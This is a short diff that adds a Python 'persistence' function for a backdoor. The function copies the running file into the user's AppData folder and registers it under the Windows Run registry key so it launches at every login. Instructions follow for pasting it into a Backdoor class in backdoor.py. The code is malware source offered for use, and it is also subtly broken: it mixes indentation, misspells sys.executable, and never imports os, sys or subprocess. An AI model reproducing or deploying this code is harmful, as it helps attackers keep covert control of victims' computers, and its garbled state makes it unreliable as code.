@@ -1,0 +1,16 @@
+import shutil
+
+def persistence(self):
+	secret_loc = os.environ["appdata"]+ "\\NAME.exe"
+	try:
+    shutil.copyfile(__file__, secret_loc)
+  except:
+    shutil.copyfile(sys.executabel, secret_loc)
+	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v name /t REG_SZ /d "' + secret_loc + '"', shell=True)
+  
+  
+  
+  if you want to make this payload persistant .
+  1)copy pase line 1 im backdoor.py file a the top of class
+  2) copy past this function inside the Backdoor Class in backdoor.py file
+  3) add this line in __init__ method --> self.persistence()
